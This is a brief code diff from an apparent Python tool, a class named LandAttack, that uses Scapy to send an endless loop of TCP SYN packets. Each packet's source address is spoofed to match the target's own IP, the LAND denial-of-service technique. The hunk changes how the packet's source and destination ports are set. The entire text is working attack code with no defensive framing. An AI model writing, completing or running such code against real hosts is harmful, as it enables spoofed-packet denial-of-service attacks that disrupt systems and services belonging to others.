@@ -16,7 +16,7 @@ class LandAttack:
     def land_attack(self, count):
         while self.sending:
             L3 = IP(src=self.dst_ip, dst=self.dst_ip)
-            L4 = TCP(flags='S', sport=RandShort(), dport=self.dst_port)
+            L4 = TCP(flags='S', sport=self.dst_port)
             L5 = Raw(load=self.data)
             pkt = L3 / L4 / L5
             send(pkt)
